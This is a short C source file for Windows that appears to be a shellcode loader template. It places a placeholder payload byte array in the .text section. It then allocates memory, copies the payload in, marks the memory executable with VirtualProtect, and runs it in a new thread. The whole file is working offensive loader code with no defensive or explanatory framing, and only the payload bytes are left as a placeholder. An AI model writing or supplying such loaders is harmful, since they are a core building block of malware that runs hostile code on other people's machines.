#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#pragma section(".text")
__declspec(allocate(".text")) const unsigned char payl[] = {
	<PAYLOAD>
};

int main(void) {
    
	void * exec_mem;
	BOOL rv;
	HANDLE th;
    DWORD oldprotect = 0;

	unsigned int len = sizeof(payl);
	
	// Allocate memory buffer for payload
	exec_mem = VirtualAlloc(0, len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

	// Copy payload to new buffer
	RtlMoveMemory(exec_mem, payl, len);
	
	// Set new buffer as executable
	rv = VirtualProtect(exec_mem, len, PAGE_EXECUTE_READ, &oldprotect);

	// Run the payload
	if ( rv != 0 ) {
			th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE) exec_mem, 0, 0, 0);
			WaitForSingleObject(th, -1);
	}

	return 0;
}